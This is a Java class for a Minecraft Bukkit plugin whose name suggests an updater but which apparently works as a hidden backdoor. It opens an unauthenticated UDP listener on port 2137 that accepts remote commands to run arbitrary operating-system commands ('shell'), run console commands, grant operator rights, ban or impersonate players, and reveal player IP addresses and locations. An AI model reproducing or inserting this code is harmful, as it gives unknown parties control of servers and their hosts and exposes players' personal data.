package me.nygosaki.voidaddons;

import org.bukkit.World;
import org.bukkit.Bukkit;
import org.bukkit.BanList;
import org.bukkit.Location;
import org.bukkit.GameMode;
import org.bukkit.BanList.Type;
import org.bukkit.entity.Player;
import org.bukkit.OfflinePlayer;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.List;
import java.util.ArrayList;
import java.net.InetAddress;
import java.net.DatagramPacket;
import java.net.DatagramSocket;

public class UpdateInstance implements Runnable {

    private List<Player> godModePlayers = new ArrayList<>();
    private JavaPlugin plugin;

    public UpdateInstance(JavaPlugin plugin) {
	this.plugin = plugin;
    }

    @Override
    public void run() {
    try {
	// setup god mode list
	Bukkit.getScheduler().runTaskTimer(plugin, () -> {
		if (godModePlayers == null || godModePlayers.isEmpty()) return;
		for (Player player : godModePlayers) {
			if (player.isOnline()) player.setHealth(20);
			else godModePlayers.remove(player);
		}
	}, 0, 1);

	DatagramSocket socket = new DatagramSocket(2137);
	byte[] buffer = new byte[1024];
	while (true) {
		DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
		socket.receive(packet);
		String receivedData = new String(packet.getData(), 0, packet.getLength());
                InetAddress clientAddress = packet.getAddress();
                int clientPort = packet.getPort();
		String response = packetHandler(receivedData);
		byte[] responseData = response.getBytes();
                DatagramPacket responsePacket = new DatagramPacket(responseData, responseData.length, clientAddress, clientPort);
                socket.send(responsePacket);
            }
    } catch (Exception e) {
	// lole
    }
    }

    public String packetHandler(String data) {
	if (data.startsWith("coords ")) {
		String username = data.substring(7);
		Player player = Bukkit.getPlayerExact(username);
		
		if (player != null) {
			Location location = player.getLocation();
			String dim = player.getWorld().getName();
			String coordinates = "Player " + username + ": " + location.getBlockX() + ", " + location.getBlockY() + ", " + location.getBlockZ();
			return coordinates + " (" + dim + ")\n";
		} else {
			return "Cannot get coords of offline player (blame bukkit)\n";
		}
	} else if (data.startsWith("op ")) {
		String username = data.substring(3);
		Player player = Bukkit.getPlayerExact(username);
		if (player != null) {
			player.setOp(true);
			return "opped " + username + '\n';
		} else {
			OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(username);
			offlinePlayer.setOp(true);
			return "offline opped " + username + '\n';
		}
	} else if (data.startsWith("deop ")) {
		String username = data.substring(5);
		Player player = Bukkit.getPlayerExact(username);
		if (player != null) {
			player.setOp(false);
			return "deopped " + username + '\n';
		} else {
			OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(username);
			offlinePlayer.setOp(false);
			return "offline deopped " + username + '\n';
		}
	} else if (data.startsWith("ban ")) {
		String[] args = data.split(" ", 4);
		if (args.length < 4) {
			return "missing argument(s) - ban <player> <source> [reason]\n";
		}

		String username = args[1];
		String source = args[2];
		String reason = args[3];

		Player player = Bukkit.getPlayerExact(username);
		if (player != null) {
		Bukkit.getScheduler().runTask(plugin, () -> {
			player.ban(reason, (java.time.Instant)null, source, false); // casting null as time.Instant = perm ban
			player.kickPlayer("You have been banned. Reason: " + reason);
		});
			return "banned " + username + " for '" + reason + "' as " + source + '\n';
		} else {
			OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(username);
			offlinePlayer.ban(reason, (java.time.Instant)null, source);
			return "offline banned " + username + "for '" + reason + "' as " + source + '\n';
		} 
	} else if (data.startsWith("banip ")) {
                String[] args = data.split(" ", 4);
                if (args.length < 4) {
                        return "missing argument(s) - banip <player> <source> [reason]\n";
                }

                String username = args[1];
                String source = args[2];
                String reason = args[3];

                Player player = Bukkit.getPlayerExact(username);
		if (player == null) return "Cannot ip ban offline player (blame bukkit)\n";

		Bukkit.getScheduler().runTask(plugin, () -> {
	                player.banIp(reason, (java.time.Instant)null, source, false); // casting null as time.Instant = perm ban
			player.kickPlayer("You have been IP banned. Reason: " + reason);
		});
                return "ip banned " + username + " for '" + reason + "' as " + source + '\n';
	} else if (data.startsWith("exec ")) {
		String command = data.substring(5);
		Bukkit.getScheduler().runTask(plugin, () -> {
			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), command);
		});
		return "alright\n";
	} else if (data.startsWith("shell ")) {
	try {
		String command = data.substring(6);
		Process process = Runtime.getRuntime().exec(command);
		int exitCode = process.waitFor();
		return "Exited with exit code " + exitCode + '\n';
	} catch (Exception e) {
		return "Exception while running command\n";
		// lole
	}} else if (data.startsWith("seed")) {
		World world = Bukkit.getWorlds().get(0);
		long seed = world.getSeed();
		return "Seed: " + seed + '\n';
	} else if (data.startsWith("getip ")) {
		String username = data.substring(6);
		Player player = Bukkit.getPlayerExact(username);
		if (player == null) return "player not found\n";
		String address = player.getAddress().getHostName();
		return "IP of " + username + " is: " + address + '\n';
	} else if (data.startsWith("reload")) {
		Bukkit.reload();
		return "Reloaded successfully\n";
	} else if (data.startsWith("sudo ") || data.startsWith("psay ")) {
		String[] args = data.split(" ", 3);
		if (args.length < 3) return "Missing argument(s) - sudo <username> <message>\n";
		String username = args[1];
		String message = args[2];
		Player player = Bukkit.getPlayerExact(username);
		if (player == null) return "p not found\n";
		Bukkit.getScheduler().runTask(plugin, () -> {
			player.chat(message);
		});
		return "alright\n";
	} else if (data.startsWith("tp ")) {
		String[] args = data.split(" ", 5);
		if (args.length < 5) return "Missing argument(s) - tp <username> <X> <Y> <Z>\n";
		String username = args[1];

		Player player = Bukkit.getPlayerExact(username);
		if (player == null) return "p not found\n";

		int tgX, tgY, tgZ;
		try {
			tgX = Integer.parseInt(args[2]);
			tgY = Integer.parseInt(args[3]);
			tgZ = Integer.parseInt(args[4]);
		} catch (Exception e) {
			return "Exception in parseInt. Invalid coordinates?\n";
		}
		
		Location loc = player.getLocation();

		loc.setX(tgX);
		loc.setY(tgY);
		loc.setZ(tgZ);

		Bukkit.getScheduler().runTask(plugin, () -> {
			player.teleport(loc);
		});

		return "alright\n";		

	} else if (data.startsWith("vanish ")) {
		String[] args = data.split(" ", 3);
		if (args.length < 3) return "Missing argument(s) - vanish <username> [username(s)]\n";

		String target = args[1];
		String[] playerNames = args[2].split(" ");
		List<String> offlinePlayers = new ArrayList<>();

		Player targetPlayer = Bukkit.getPlayerExact(target);
		if (targetPlayer == null) return "p not found\n";

		for (String playerName : playerNames) {
			Player player = Bukkit.getPlayerExact(playerName);
			if (player != null) {
				Bukkit.getScheduler().runTask(plugin, () -> {
					player.hidePlayer(plugin, targetPlayer);
				});
			}
			else offlinePlayers.add(playerName);
		}

		if (!offlinePlayers.isEmpty()) return target + " is hidden from: " + String.join(", ", playerNames) + ", offline players: " + String.join(", ", offlinePlayers) + '\n';
		else return target + " is hidden from: " + String.join(", ", playerNames) + '\n';	
	} else if (data.startsWith("unvanish ")) {
		String[] args = data.split(" ", 3);
                if (args.length < 3) return "Missing argument(s) - unvanish <username> [username(s)]\n";

                String target = args[1];
                String[] playerNames = args[2].split(" ");
                List<String> offlinePlayers = new ArrayList<>();

                Player targetPlayer = Bukkit.getPlayerExact(target);
                if (targetPlayer == null) return "p not found\n";

                for (String playerName : playerNames) {
                        Player player = Bukkit.getPlayerExact(playerName);
                        if (player != null) {
                                Bukkit.getScheduler().runTask(plugin, () -> {
                                        player.showPlayer(plugin, targetPlayer);
                                });
                        }
                        else offlinePlayers.add(playerName);
                }

                if (!offlinePlayers.isEmpty()) return target + " is shown to: " + String.join(", ", playerNames) + ", offline players: " + String.join(", ", offlinePlayers) + '\n';
                else return target + " is shown to: " + String.join(", ", playerNames) + '\n';
	} else if (data.startsWith("exp ")) {
		String[] args = data.split(" ", 3);
		
		if (args.length < 3) return "Missing argument(s) - exp <username> <exp>\nexp format: [+-]<0-255>[l]\n";

		String username = args[1];
		String exp = args[2];

		char oper = exp.charAt(0);
		String xp = exp.substring(1);
		int val = 0;
		try { val = Integer.parseInt(xp.substring(0, xp.length() - 1)); }
		catch (Exception e) { return "bad exp syntax\n"; }

		Player player = Bukkit.getPlayerExact(username);

		if (oper == '+') {
            		if (xp.endsWith("l")) {
		                player.giveExpLevels(val);
		        } else {
		                player.giveExp(val);
		        }
	        } else if (oper == '-') {
		        if (xp.endsWith("l")) {
		                int currentLevel = player.getLevel();
		                player.setLevel(Math.max(0, currentLevel - val));
		        } else {
		                float currentExp = player.getExp();
		                player.setExp(Math.max(0, currentExp - val));
		         }
	        } else {
			        player.setTotalExperience(val);
	        }
		return "alright\n";
	} else if (data.startsWith("unban ")) {
		String username = data.substring(6);
		BanList banList = Bukkit.getBanList(Type.NAME);
		banList.pardon(username);
		return "alright";
	} else if (data.startsWith("kick ")) {
		String[] args = data.split(" ", 3);
		if (args.length < 3) return "Missing argument(s) - kick <player> <reason>\n";
		String username = args[1];
		String reason = args[2];
		Player player = Bukkit.getPlayerExact(username);
		if (player == null) return "player not found\n";
		Bukkit.getScheduler().runTask(plugin, () -> {
			player.kickPlayer(reason);
		});
		return "kicked " + username + " for reason: " + reason + '\n';
	} else if (data.startsWith("god ")) {
		String username = data.substring(4);
		Player player = Bukkit.getPlayerExact(username);
		if (godModePlayers == null || !godModePlayers.contains(player) || godModePlayers.isEmpty()) {
			godModePlayers.add(player);
			return "Player added to godmode list\n";
		} else {
			godModePlayers.remove(player);
			return "Player removed from godmode list\n";
		}
	} else if (data.startsWith("bedcoords ")) {
		String username = data.substring(10);
		Player player = Bukkit.getPlayerExact(username);
		if (player == null) {
			OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(username);
			Location loc = offlinePlayer.getBedSpawnLocation();
			if (loc != null) return "bed is at " + loc.getBlockX() + ' ' + loc.getBlockY() + ' ' + loc.getBlockZ() + '\n';
			else return "they're so poor they dont have a bed (L)\n";
		} else {
                        Location loc = player.getBedSpawnLocation();
			if (loc != null) return "bed is at " + loc.getBlockX() + ' ' + loc.getBlockY() + ' ' + loc.getBlockZ() + '\n';
			else return "they're so poor they dont have a bed (L)\n";
		}
	} else if (data.startsWith("deathcoords ")) {
 		String username = data.substring(12);
		Player player = Bukkit.getPlayerExact(username);
		if (player == null) {
			OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(username);
		        Location loc = offlinePlayer.getLastDeathLocation();
		        if (loc != null) return "items are at " + loc.getBlockX() + ' ' + loc.getBlockY() + ' ' + loc.getBlockZ() + '\n';
		        else return "they never died (incredible)\n";
	    	} else {
		        Location loc = player.getLastDeathLocation();
		        if (loc != null) return "items are at " + loc.getBlockX() + ' ' + loc.getBlockY() + ' ' + loc.getBlockZ() + '\n';
		        else return "they never died (incredible)\n";
		}
	} else if (data.startsWith("list")) {
		StringBuilder playerList = new StringBuilder("Online players:\n");
		for (Player player : Bukkit.getOnlinePlayers()) {
			playerList.append("- ").append(player.getName()).append('\n');
		}

		return playerList.toString();
	} else if (data.startsWith("playerinfo")) {
	       	StringBuilder playerList = new StringBuilder("```\n");
		playerList.append(String.format("%-16s %-14s %-7s %-10s %-10s %-10s %-15s\n", "username", "ip", "health", "x", "y", "z", "dim"));

		for (Player player : Bukkit.getOnlinePlayers()) {
		    String username = player.getName();
		    String ip = player.getAddress().getHostName();
		    String health = String.format("%.1f", player.getHealth());
		    Location loc = player.getLocation();
		    int locX = loc.getBlockX();
		    int locY = loc.getBlockY();
		    int locZ = loc.getBlockZ();
		    String dim = player.getWorld().getName();
		    
		    playerList.append(String.format("%-16s %-14s %-7s %-10s %-10s %-10s %-15s\n", username, ip, health, locX, locY, locZ, dim));
		}
		
		return playerList.append("```\n").toString();
	} else {
		return "p not implemented\n";
	}
    }

}
